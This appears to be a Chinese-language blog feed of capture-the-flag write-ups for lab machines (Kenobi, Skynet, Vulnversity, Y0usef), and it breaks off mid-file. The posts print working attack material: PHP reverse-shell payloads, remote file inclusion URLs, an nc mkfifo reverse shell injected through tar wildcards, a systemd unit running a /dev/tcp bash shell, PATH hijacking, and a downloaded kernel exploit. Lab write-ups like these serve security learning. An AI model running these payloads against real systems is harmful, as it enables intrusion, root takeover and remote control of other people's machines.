src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172122889.png" alt="image-20241117212242832"></p><pre><code>┌──(w3nx1z1㉿kali)-[~/桌面]└─$ nc 10.10.166.18 21220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.166.18]SITE CPFR /home/kenobi/.ssh/id_rsa # 需要我们输入350 File or directory exists, ready for destination nameSITE CPTO /var/tmp/id_rsa    # 需要我们输入250 Copy successful</code></pre><p>这样我们就将&#x2F;home&#x2F;kenobi&#x2F;.ssh&#x2F;id_rsa私钥复制到了&#x2F;var&#x2F;tmp&#x2F;id_rsa 同时根据上面任务2的第四题 我们得知rpcbind服务开启的共享文件夹服务就是挂载在了&#x2F;var文件夹上</p><pre><code>mkdir /mnt/kenobiNFSmount 10.10.166.18:/var /mnt/kenobiNFSls /mnt/kenobiNFS/tmp</code></pre><p>此时我们看到&#x2F;mnt&#x2F;kenobiNFS&#x2F;tmp文件夹下已经有了我们需要的私钥文件 下面将这个私钥文件复制到当前文件夹中</p><pre><code>cp /mnt/kenobiNFS/tmp/id_rsa .</code></pre><p>在赋予私钥文件600权限 </p><pre><code>sudo chmod 600 id_rsa</code></pre><table><thead><tr><th>权限编号</th><th>权限字符串</th><th>拥有者权限</th><th>组权限</th><th>其他人权限</th><th>常见用途</th></tr></thead><tbody><tr><td><strong>600</strong></td><td><code>rw-------</code></td><td>读写</td><td>无</td><td>无</td><td>SSH 私钥文件</td></tr><tr><td><strong>644</strong></td><td><code>rw-r--r--</code></td><td>读写</td><td>读</td><td>读</td><td>公共文件</td></tr><tr><td><strong>755</strong></td><td><code>rwxr-xr-x</code></td><td>读写执行</td><td>读执行</td><td>读执行</td><td>可执行脚本或程序</td></tr><tr><td><strong>777</strong></td><td><code>rwxrwxrwx</code></td><td>读写执行</td><td>读写执行</td><td>读写执行</td><td>开放权限，通常不推荐</td></tr></tbody></table><p>上面是一些常见的权限对应的用途 这里只能给600权限 太高权限会报错 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172132256.png" alt="image-20241117213225173"></p><p>这里给到600权限后 我们连上shell 拿到用户文件夹下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172133509.png" alt="image-20241117213330434"></p><p>What is Kenobi’s user flag (&#x2F;home&#x2F;kenobi&#x2F;user.txt)?</p><pre><code>d0b0f3f53b6caa532a83915e19224899</code></pre><h2 id="Privilege-Escalation-with-Path-Variable-Manipulation-suid提权之menu提权"><a href="#Privilege-Escalation-with-Path-Variable-Manipulation-suid提权之menu提权" class="headerlink" title="Privilege Escalation with Path Variable Manipulation(suid提权之menu提权)"></a>Privilege Escalation with Path Variable Manipulation(suid提权之menu提权)</h2><p>同样在拿到kenobi普通用户的shell之后 我们需要进行提权 进而拿到root用户的权限 也是先看一下有无可以利用的suid命令</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p>这里看到 虽然同样是给了sudo和su 但是我们并不知道kenobi用户的登陆密码 因此这里我们选择使用meun来提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172136397.png" alt="image-20241117213630328"></p><p>我们尝试运行一下这个命令 发现在执行的时候会出现三个选项 选择不同选项之后会执行对应的命令并输出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172138243.png" alt="image-20241117213824161"></p><p>这里使用strings命令 可以在这个可执行的二进制程序中查找我们可读的字符串 看到了三个选项对应的三个会执行的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172143205.png" alt="image-20241117214325146"></p><p>那我们这里使用命令劫持 伪造一个curl </p><pre><code>kenobi@kenobi:~$ cd /tmpkenobi@kenobi:/tmp$ echo /bin/sh &gt; curlkenobi@kenobi:/tmp$ chmod 777 curlkenobi@kenobi:/tmp$ export PATH=/tmp:$PATH</code></pre><p>意思就是在&#x2F;tmp中创建一个curl文件 将<code>/bin/sh</code>写入这个curl文件中并给予他777的权限 同时在环境变量中将将 <code>/tmp</code> 目录添加到最前面 并在 <code>/tmp</code> 之后，保留原有的路径列表 这样的话在我们执行命令的时候 会先从&#x2F;tmp文件夹中寻找并执行 这样就可以优先执行我们伪造的“curl”文件 进而执行<code>/bin/sh</code>命令 又因为我们在执行menu时 选择选项1 执行的是</p><pre><code>curl -I localhost</code></pre><p>这样在命令劫持之后就变成了</p><pre><code>/bin/sh -I localhost</code></pre><p>但是因为menu命令有suid权限 那此时执行的<code>/bin/sh</code>也就有了root权限 从而给我们返回一个root权限的shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172155130.png" alt="image-20241117215509068"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.Samba 共享文件夹读取、下载远程靶机中的文件</p><p>2.proftpd 1.3.5的mod_copy 模块漏洞允许任意客户端将文件从文件系统的任何部分复制到选定的位置</p><p>3.将共享的远程文件夹挂载到本地文件夹中 复制出上一步移动的私钥文件 ssh连接普通用户</p><p>4.SUID提权 利用命令劫持 执行<code>/bin/sh</code>命令 拿到root权限的shell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Kenobi&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Kenobi&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Kenobi&quot;&gt;&lt;/a&gt;Offen</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="thm学习笔记" scheme="http://w3nx1z1.github.io/tags/thm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Skynet</title>
    <link href="http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-Skynet/"/>
    <id>http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-Skynet/</id>
    <published>2024-11-26T09:04:38.428Z</published>
    <updated>2024-11-26T09:06:33.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Skynet"><a href="#Offensive-Pentesting-Skynet" class="headerlink" title="Offensive Pentesting-Skynet"></a>Offensive Pentesting-Skynet</h1><h2 id="扫端口-分析共享文件夹服务"><a href="#扫端口-分析共享文件夹服务" class="headerlink" title="扫端口 分析共享文件夹服务"></a>扫端口 分析共享文件夹服务</h2><p>拿到之后先扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182033539.png" alt="image-20241118203335458"></p><p>同样发现了139和445端口 猜测存在共享目录 处理手法类似Kenobi</p><pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.220.154 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182123462.png" alt="image-20241118212335390"></p><p>根据这一部分</p><pre><code>|   SKYNET\milesdyson (RID: 1000)|     Full name:   |     Description: |_    Flags:       Normal user account</code></pre><p>可以判断出用户是milesdyson</p><p>同样发现了anonymous路径 共享的是<code>C:\srv\samba</code>目录 连接上看看有什么文件</p><pre><code>smbclient //10.10.53.137/anonymous</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182131231.png" alt="image-20241118213143153"></p><pre><code>smbget -R smb://10.10.53.137/anonymous</code></pre><p>两个有效文件 一个让修改密码 一个看起来是密码字典文件 应该是需要我们结合账户名milesdyson 来进行一个密码的爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182133535.png" alt="image-20241118213331468"></p><h2 id="扫目录-发现邮件登陆页面"><a href="#扫目录-发现邮件登陆页面" class="headerlink" title="扫目录 发现邮件登陆页面"></a>扫目录 发现邮件登陆页面</h2><p>我们先访问一下网页</p><p>下面使用gobuster来扫目录</p><pre><code>gobuster dir -u http://10.10.220.154/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182137214.png" alt="image-20241118213759133"></p><p>发现一个关键的目录：&#x2F;squirrelmail 进行访问 发现是一个邮件管理系统的后台登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182138044.png" alt="image-20241118213846975"></p><p>使用burpsuite进行抓包爆破 得到密码cyborg007haloterminator</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182148376.png" alt="image-20241118214811299"></p><p>What is Miles password for his emails?</p><pre><code>cyborg007haloterminator</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182150075.png" alt="image-20241118215055992"></p><p>登陆之后 可以看到第一封是一个密码重置的邮件</p><pre><code>)s&#123;A&amp;2Z=F^n_E.B` </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182248278.png" alt="image-20241118224847168"></p><h2 id="使用smbclient连接smb共享"><a href="#使用smbclient连接smb共享" class="headerlink" title="使用smbclient连接smb共享"></a>使用smbclient连接smb共享</h2><pre><code>smbclient -U milesdyson //10.10.49.13/milesdyson </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182330217.png" alt="image-20241118233005964"></p><p>在其中找到一个important.txt 导出</p><pre><code>1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wife</code></pre><p>找到隐藏的CMS路径 <code>/45kra24zxs28v3yd</code> 访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182338109.png" alt="image-20241118233813780"></p><p>What is the hidden directory?</p><pre><code>/45kra24zxs28v3yd</code></pre><h2 id="Cuppa-CMS存在远程文件包含漏洞"><a href="#Cuppa-CMS存在远程文件包含漏洞" class="headerlink" title="Cuppa CMS存在远程文件包含漏洞"></a>Cuppa CMS存在远程文件包含漏洞</h2><p>找到这个隐藏目录之后 我们先扫一下 看看有没有进一步可以利用的目录或者文件</p><pre><code>python3 dirsearch.py -u http://10.10.49.13/45kra24zxs28v3yd/ -i 200</code></pre><p>找到一个<code>administrator/ </code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191534967.png" alt="image-20241119153421896"></p><p>访问一下 发现是Cuppa CMS</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191535564.png" alt="image-20241119153518460"></p><p>搜一下这个CMS的漏洞 发现有远程文件包含 也就是<code>Remote File Inclusion</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191535897.png" alt="image-20241119153543837"></p><p>What is the vulnerability called when you can include a remote file for malicious purposes?</p><pre><code>remote file inclusion </code></pre><h3 id="利用文件包含读取当前用户的flag"><a href="#利用文件包含读取当前用户的flag" class="headerlink" title="利用文件包含读取当前用户的flag"></a>利用文件包含读取当前用户的flag</h3><p>我们先来看一下这个漏洞利用文件</p><pre><code>searchsploit -p 25971.txtcp /usr/share/exploitdb/exploits/php/webapps/25971.txt 25971.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191538074.png" alt="image-20241119153829015"></p><p>主要是这部分 在<code>alerts/alertConfigField.php</code>路径传入<code>urlConfig</code>参数就可以实现远程文件包含</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191539359.png" alt="image-20241119153906280"></p><p>burpsuite抓包 尝试读取用户文件夹下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191540009.png" alt="image-20241119154037894"></p><p>What is the user flag?</p><pre><code>7ce5c2109a40f958099283600a9ae807</code></pre><h2 id="远程文件包含反弹shell并提权"><a href="#远程文件包含反弹shell并提权" class="headerlink" title="远程文件包含反弹shell并提权"></a>远程文件包含反弹shell并提权</h2><p><a href="https://www.cnblogs.com/shacker/p/15943923.html">渗透测试之远程文件包含 - shacker_shen - 博客园</a></p><p>操作可以参考上面这篇文章 下面来进行我们的操作 </p><p>先创建一个<code>reverse_shell.txt</code></p><pre><code class="php">&lt;?php$ip=&quot;10.14.92.176&quot;;$port=2333;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><p>开启Apache服务 将这个反弹shell的文件复制到我们本地的网站根目录下</p><pre><code>systemctl start apache2.servicecp reverse_shell.txt /var/www/html/reverse_shell.txt</code></pre><p>在靶机网站中访问</p><pre><code>http://10.10.24.215/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.92.176/reverse_shell.txt?</code></pre><p>本机监听2333端口 成功反弹shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191601218.png" alt="image-20241119160123155"></p><p>这里提权有两种方法</p><h3 id="内核版本漏洞提权"><a href="#内核版本漏洞提权" class="headerlink" title="内核版本漏洞提权"></a>内核版本漏洞提权</h3><p>看一下内核版本 </p><pre><code>uname -a</code></pre><p>发现是4.8.0 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192113756.png" alt="image-20241119211318664"></p><p>searchsploit找一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192115148.png" alt="image-20241119211515069"></p><p>使用43418.c </p><pre><code>searchsploit -p 43418.c cp /usr/share/exploitdb/exploits/linux/local/43418.c .cp 43418.c /var/www/html/43418.c</code></pre><p>在靶机上下载这个.c文件</p><pre><code>wget 10.14.92.176/43418.cgcc 43418.c -o pwn1chmod +x pwn1./pwn1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192119096.png" alt="image-20241119211959014"></p><p>What is the root flag?</p><pre><code>3f0372db24753accc7179a282cd6a949</code></pre><h3 id="tar通配符提权"><a href="#tar通配符提权" class="headerlink" title="tar通配符提权"></a>tar通配符提权</h3><p>在用户文件夹下发现一个backups文件夹 里面有个backup.sh 内容是使用tar将网站根目录中的所有文件和文件夹进行打包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411221046929.png" alt="image-20241122104657848"></p><p>看一下定时任务</p><pre><code>cat /etc/crontab</code></pre><p>看起来是每隔一分钟执行一次 而且权限还是root</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411221048097.png" alt="image-20241122104851022"></p><p>两种做法 一种是反弹shell 一种直接创建一个二进制文件执行获得root权限</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.114.143 2333 &gt;/tmp/f&quot; &gt; shell.shtouch &quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;touch &quot;/var/www/html/--checkpoint=1&quot;</code></pre><p>在监听一下</p><pre><code>nc -lvvp 2333</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Skynet&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Skynet&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Skynet&quot;&gt;&lt;/a&gt;Offen</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="thm学习笔记" scheme="http://w3nx1z1.github.io/tags/thm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Vulnversity</title>
    <link href="http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-Vulnversity/"/>
    <id>http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-Vulnversity/</id>
    <published>2024-11-26T09:04:30.499Z</published>
    <updated>2024-11-26T09:05:56.050Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Vulnversity"><a href="#Offensive-Pentesting-Vulnversity" class="headerlink" title="Offensive Pentesting-Vulnversity"></a>Offensive Pentesting-Vulnversity</h1><h2 id="nmap使用"><a href="#nmap使用" class="headerlink" title="nmap使用"></a>nmap使用</h2><table><thead><tr><th>Nmap flag</th><th>Description</th></tr></thead><tbody><tr><td>-sV</td><td>Attempts to determine the version of the services running</td></tr><tr><td>-p <x> or -p-</td><td>Port scan for port <x> or scan all ports</td></tr><tr><td>-Pn</td><td>Disable host discovery and scan for open ports</td></tr><tr><td>-A</td><td>Enables OS and version detection, executes in-build scripts for further enumeration</td></tr><tr><td>-sC</td><td>Scan with the default Nmap scripts</td></tr><tr><td>-v</td><td>Verbose mode</td></tr><tr><td>-sU</td><td>UDP port scan</td></tr><tr><td>-sS</td><td>TCP SYN port scan</td></tr></tbody></table><p>这里我们主要使用两个命令</p><pre><code>nmap -T4 -sC -sV 10.10.229.26 或 nmap -A -p- -v 10.10.229.26</code></pre><p>后面这个会比较慢 但是更为全面</p><pre><code>1. nmap -T4 -sC -sV 10.10.229.26-T4: 这个选项控制 nmap 的扫描速度和时间。T4 是一个优化选项，表示在扫描过程中提高扫描速度。-sC: 这个选项启用 默认脚本扫描，也就是使用 nmap 提供的默认脚本（Nmap Scripting Engine，NSE）。-sV: 这个选项启用 版本扫描，会探测目标主机上开放端口的服务版本信息。总结: nmap -T4 -sC -sV 10.10.229.26 是一个 快速扫描，进行 版本检测 和 默认脚本扫描，重点是发现开放端口和服务版本，同时利用默认脚本探测潜在的安全问题或配置问题。2. nmap -A -p- -v 10.10.229.26-A: 这个选项启用 主动扫描，包括多种扫描功能，包含了以下几项：操作系统检测 (OS detection): 尝试识别目标主机的操作系统类型和版本。版本扫描 (Version scanning): 类似于 -sV，识别目标主机的服务和版本。脚本扫描 (Nmap Scripting Engine): 执行多种与安全相关的脚本，类似于 -sC。Traceroute: 执行路由追踪，显示目标主机的路由路径。-p-: 这个选项指定 nmap 扫描 所有端口，即从 1 到 65535 的所有端口。默认情况下，nmap 只扫描常见的 1000 个端口，使用 -p- 可以确保扫描所有端口。-v: 这个选项启用 详细输出，会提供更多的扫描信息，包括扫描进度、发现的服务、操作系统信息等。总结: nmap -A -p- -v 10.10.229.26 是一个 全面扫描，执行操作系统检测、服务版本检测、脚本扫描、路由追踪，并且扫描所有端口。它提供了更多的信息和细节，适合用来进行全面的目标分析，尤其是在信息收集阶段。主要区别：扫描范围：nmap -T4 -sC -sV：只扫描常见的 1000 个端口，快速进行版本和脚本扫描。nmap -A -p- -v：扫描所有 65535 个端口，进行操作系统检测、版本检测、脚本扫描等更全面的扫描。扫描内容：nmap -T4 -sC -sV：使用默认脚本集、版本检测和较快的扫描速度。nmap -A -p- -v：进行更加全面的扫描，涵盖操作系统识别、服务版本、NSE 脚本、Traceroute 等。速度与信息：nmap -T4 -sC -sV 适用于 较快的扫描，并获取基本的版本和常见的安全漏洞信息。nmap -A -p- -v 适用于 全面的扫描，可以得到更加详细的信息，但也会需要更长的时间。总结：nmap -T4 -sC -sV 10.10.229.26 是一个快速且较为轻量的扫描，主要用于获取目标的版本信息和默认脚本扫描的结果。nmap -A -p- -v 10.10.229.26 是一个全面且深入的扫描，扫描所有端口并进行操作系统识别、服务版本检测、脚本扫描和路由追踪等。</code></pre><p>看一下扫描结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411152322027.png" alt="image-20241115232216910"></p><p>Scan the box; how many ports are open?</p><pre><code class="6">6</code></pre><p>What version of the squid proxy is running on the machine?</p><pre><code>3.5.12</code></pre><p>How many ports will Nmap scan if the flag <strong>-p-400</strong> was used?</p><pre><code>400</code></pre><p>What is the most likely operating system this machine is running?</p><pre><code>ubuntu</code></pre><p>What port is the web server running on?</p><pre><code>3333</code></pre><p>What is the flag for enabling verbose mode using Nmap?</p><pre><code>-v</code></pre><h2 id="gobuster使用"><a href="#gobuster使用" class="headerlink" title="gobuster使用"></a>gobuster使用</h2><table><thead><tr><th><strong>Gobuster 标志</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>-e</td><td>在控制台中打印完整的 URL</td></tr><tr><td>-u</td><td>目标 URL</td></tr><tr><td>-w</td><td>单词列表的路径</td></tr><tr><td>-U 和 -P</td><td>基本身份验证的用户名和密码</td></tr><tr><td>-p <strong><x></strong></td><td>用于请求的代理</td></tr><tr><td>-c <http Cookie></td><td>指定用于模拟身份验证的 Cookie</td></tr></tbody></table><p>在使用的时候需要指定字典的路径</p><pre><code>gobuster dir -u http://10.10.7.199:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161112233.png" alt="image-20241116111237088"></p><p>扫除这个<code>/internal</code>路由之后 我们可以尝试访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161736826.png" alt="image-20241116173614626"></p><p>What is the directory that has an upload form page?</p><pre><code>/internal/</code></pre><h2 id="文件上传-反弹shell"><a href="#文件上传-反弹shell" class="headerlink" title="文件上传(反弹shell)"></a>文件上传(反弹shell)</h2><p>在文件上传页面 我们直接写入反弹shell的马 ban了php后缀  就使用.phtml 上传成功</p><pre><code class="php">&lt;?php$ip=&quot;10.11.114.143&quot;;$port=2333;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161946467.png" alt="imagep><p>成功上传后 访问</p><pre><code>http://10.10.40.101:3333/internal/uploads/反弹shell.phtml</code></pre><p>成功拿到shell 在创建一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161950028.png" alt="image-20241116195050982"></p><p>也找到了当前web服务的用户是bill和bill用户文件夹下的flag</p><p>What common file type you’d want to upload to exploit the server is blocked? Try a couple to find out.</p><pre><code>.php</code></pre><p>What extension is allowed after running the above exercise?</p><pre><code>.phtml</code></pre><p>What is the name of the user who manages the webserver?</p><pre><code>bill</code></pre><p>What is the user flag?</p><pre><code>8bd7992fbe8a6ad22a63361004cfcedb</code></pre><h2 id="提权-suid提权之systemctl"><a href="#提权-suid提权之systemctl" class="headerlink" title="提权(suid提权之systemctl)"></a>提权(suid提权之systemctl)</h2><p>这部分需要我们拿到root用户的flag 先看一下suid 虽然这里su和sudo也是suid权限 但是因为我们不知道bill用户的登陆密码 因此这里我们使用systemctl进行提权 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162009608.png" alt="image-20241116200950474"></p><p>可以参考这篇文章<a href="https://www.cnblogs.com/yuy0ung/articles/18421470">Linux提权-suid相关提权思路 - Yuy0ung - 博客园</a></p><pre><code>因为systemctl有suid权限，所以可以创建一个systemctl service,里面写入反弹shell的命令，通过软链接，将创建的服务嵌入他的服务中，即可反弹shell 此时反弹的shell就是root权限</code></pre><p>先在我们的kali攻击机中编写一个shell.service</p><pre><code>[Unit]Description=reverseshell[Service]Type=oneshotExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.11.114.143/1234 0&gt;&amp;1&#39;[Install]WantedBy=multi-user.target</code></pre><p>将这个service文件放到网站根目录中</p><pre><code>cp shell.service /var/www/html/shell.service</code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>在我们上一步反弹的shell中使用wget将这个service下载下来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162018061.png" alt="image-20241116201849892"></p><p>将单元文件复制到<code>/dev/shm</code>目录并使用systemctl加载</p><pre><code>默认情况下，systemctl 命令是加载文档中所写的 /usr/lib/systemd/system/ 文件夹（此文件夹包含系统预定义的单元文件）和 /etc/systemd/system/ 文件夹（此文件夹包含用户定义的单元文件）。不过通常测试人员获取的低权限账号是不具备这两个目录写入权限的。由于临时目录 /tmp 中的内容可能会被随时更改或删除，所以 systemctl 也无法加载 /tmp 目录中的文件。那么解决方法是将服务单元文件放置在 /dev/shm 文件夹（Linux 中的共享内存文件系统，用于存放临时文件）下，该文件夹下的单元文件可以被 systemctl 正常加载且任意用户可写</code></pre><p>执行下面操作</p><pre><code>cp shell.service /dev/shm/shell.service</code></pre><p>使用systemctl加载服务单元文件</p><pre><code>systemctl link /dev/shm/shell.service# 建立链接systemctl enable --now /dev/shm/shell.service#启动服务   注：路径一定要写全</code></pre><p>加载成功 成功反弹shell到root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162023545.png" alt="image-20241116202303326"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Vulnversity&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Vulnversity&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Vulnver</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="thm学习笔记" scheme="http://w3nx1z1.github.io/tags/thm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场Y0usef渗透测试wp</title>
    <link href="http://w3nx1z1.github.io/2024/11/13/vulnhub%E9%9D%B6%E5%9C%BAY0usef%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95wp/"/>
    <id>http://w3nx1z1.github.io/2024/11/13/vulnhub%E9%9D%B6%E5%9C%BAY0usef%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95wp/</id>
    <published>2024-11-13T07:53:54.765Z</published>
    <updated>2024-11-13T15:38:53.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场Y0usef渗透测试wp"><a href="#vulnhub靶场Y0usef渗透测试wp" class="headerlink" title="vulnhub靶场Y0usef渗透测试wp"></a>vulnhub靶场Y0usef渗透测试wp</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>Get two flagDifficulty : easyThis works better with VirtualBox rather than VMware</code></pre><p>描述告诉我们这个靶场运行在virtualbox上比在vmware上更好 但是我没装 只能用vmware  直接导入下载的ova文件之后发生报错</p><pre><code>Capacity mismatch for disk H:\vulnhub靶场练习镜像\y0usef\y0usef\\y0usef-disk1.vmdk。</code></pre><p>大概就是告诉我们磁盘空间不匹配之类的 在网上找了个解决办法 先把ova文件解压 可以得到一个 vmdk 一个ovf文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131634298.png" alt="image-20241113163426197"></p><p>记事本打开ovf文件 将里面内容全部删掉 替换为</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;Envelope ovf:version=&quot;1.0&quot; xml:lang=&quot;en-US&quot; xmlns=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot; xmlns:ovf=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot; xmlns:rasd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData&quot; xmlns:vssd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:vbox=&quot;http://www.virtualbox.org/ovf/machine&quot;&gt;  &lt;References&gt;    &lt;File ovf:id=&quot;file1&quot; ovf:href=&quot;y0usef-disk001.vmdk&quot;/&gt;  &lt;/References&gt;  &lt;DiskSection&gt;    &lt;Info&gt;Virtual disk information&lt;/Info&gt;    &lt;Disk ovf:capacity=&quot;30&quot; ovf:capacityAllocationUnits=&quot;byte * 2^30&quot; ovf:diskId=&quot;vmdisk1&quot; ovf:fileRef=&quot;file1&quot; ovf:format=&quot;http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized&quot;/&gt;  &lt;/DiskSection&gt;  &lt;NetworkSection&gt;    &lt;Info&gt;Logical networks used in the package&lt;/Info&gt;    &lt;Network ovf:name=&quot;NAT&quot;&gt;      &lt;Description&gt;Logical network used by this appliance.&lt;/Description&gt;    &lt;/Network&gt;  &lt;/NetworkSection&gt;  &lt;VirtualSystem ovf:id=&quot;vm&quot;&gt;    &lt;Info&gt;A virtual machine&lt;/Info&gt;    &lt;EulaSection&gt;      &lt;Info&gt;License agreement for the virtual system&lt;/Info&gt;      &lt;License&gt;Go https://2ba.cc&lt;/License&gt;    &lt;/EulaSection&gt;    &lt;OperatingSystemSection ovf:id=&quot;96&quot;&gt;        &lt;Info&gt;The kind of installed guest operating system&lt;/Info&gt;        &lt;Description&gt;Debian_64&lt;/Description&gt;        &lt;vbox:OSType ovf:required=&quot;false&quot;&gt;Debian_64&lt;/vbox:OSType&gt;      &lt;/OperatingSystemSection&gt;    &lt;VirtualHardwareSection&gt;      &lt;Info&gt;Virtual hardware requirements&lt;/Info&gt;      &lt;System&gt;        &lt;vssd:ElementName&gt;Virtual Hardware Family&lt;/vssd:ElementName&gt;        &lt;vssd:InstanceID&gt;0&lt;/vssd:InstanceID&gt;        &lt;vssd:VirtualSystemIdentifier&gt;vm&lt;/vssd:VirtualSystemIdentifier&gt;        &lt;vssd:VirtualSystemType&gt;vm&lt;/vssd:VirtualSystemType&gt;      &lt;/System&gt;      &lt;Item&gt;        &lt;rasd:Caption&gt;1 virtual CPU&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Number of virtual 